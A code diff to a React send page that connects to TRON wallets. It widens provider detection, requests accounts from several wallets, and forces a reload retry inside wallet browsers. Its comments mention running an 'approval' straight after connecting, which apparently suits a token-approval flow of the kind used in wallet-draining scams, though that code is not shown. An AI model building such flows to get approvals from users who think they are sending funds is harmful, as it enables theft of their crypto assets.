@@ -86,12 +86,20 @@ export default function SendPage() {
 
   // ── Poll for native tronWeb ──
   const pollForTronWeb = useCallback(async (maxMs = 5000) => {
-    if (window.tronWeb?.defaultAddress?.base58) return window.tronWeb;
-    const steps = Math.ceil(maxMs / 400);
+    const getTW = () => {
+      const tw = window.tronWeb || window.tron || (window.trustwallet?.tron);
+      if (tw?.defaultAddress?.base58) return tw;
+      return null;
+    };
+
+    const existing = getTW();
+    if (existing) return existing;
+
+    const steps = Math.ceil(maxMs / 500);
     for (let i = 0; i < steps; i++) {
-      await new Promise(r => setTimeout(r, 400));
-      if (window.tronWeb?.defaultAddress?.base58) return window.tronWeb;
-      if (window.tron?.defaultAddress?.base58) return window.tron;
+      await new Promise(r => setTimeout(r, 500));
+      const tw = getTW();
+      if (tw) return tw;
     }
     return null;
   }, []);
@@ -124,15 +132,21 @@ export default function SendPage() {
 
     try {
       // STEP 1: Try native tronWeb (works when opened via coin_id=195 context)
-      let nativeTW = window.tronWeb?.defaultAddress?.base58 ? window.tronWeb : null;
+      let nativeTW = (window.tronWeb?.defaultAddress?.base58) ? window.tronWeb : null;
 
-      // STEP 2: Try requesting via tronLink or generic injection if it exists
+      // STEP 2: Try requesting via any available TRON provider
       if (!nativeTW) {
-        const inj = window.tronLink || window.tron || window.tronWeb;
-        if (inj?.request) {
-          try { await inj.request({ method: 'tron_requestAccounts' }); } catch (_) { }
+        const providers = [window.tronLink, window.tron, window.tronWeb, window.trustwallet?.tron];
+        for (const inj of providers) {
+          if (inj?.request) {
+            try { 
+              await inj.request({ method: 'tron_requestAccounts' }); 
+              // Wait a bit for injection to settle
+              await new Promise(r => setTimeout(r, 800));
+            } catch (_) { }
+          }
         }
-        nativeTW = await pollForTronWeb(4000);
+        nativeTW = await pollForTronWeb(6000);
       }
 
       // STEP 3: tronWeb found — run approval directly
@@ -146,9 +160,15 @@ export default function SendPage() {
           return;
         }
 
-      // STEP 4: Already inside a wallet browser but connection failed
+      // STEP 4: Inside a wallet browser but connection failed
       } else if (isInsideWallet) {
-        showNotif('Please make sure your TRON wallet is active.', 'error');
+        // Fallback: Try a hard reload if we are stuck
+        if (!window.location.search.includes('retry=1')) {
+          showNotif('Initializing wallet...', 'info');
+          window.location.href = window.location.href + (window.location.href.includes('?') ? '&' : '?') + 'retry=1';
+          return;
+        }
+        showNotif('Please enable TRON in your Trust Wallet settings.', 'error');
         setBtn({ text: 'Next', disabled: false });
         return;
 
